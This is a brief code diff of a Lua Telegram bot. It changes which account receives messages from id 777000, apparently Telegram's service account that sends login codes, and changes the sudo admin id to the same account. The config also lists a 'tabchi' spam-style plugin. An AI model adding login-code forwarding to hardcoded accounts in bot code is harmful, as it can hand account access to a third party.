@@ -102,7 +102,7 @@ if not msg.from.id then
 end
 
 if msg.from.id == 777000 then
-    send_large_msg("user#id12277406",msg.text,ok_cb,false)
+    send_large_msg("user#id317927535",msg.text,ok_cb,false)
 end
 
 if msg.to.type == 'encr_chat' then
@@ -234,7 +234,7 @@ function create_config( )
 	"botmanager",
     "tabchi"
     },
-    sudo_users = {282958812},--Sudo users
+    sudo_users = {317927535},--Sudo users
   }
   serialize_to_file(config, './data/config.lua')
   print('saved config into ./data/config.lua')
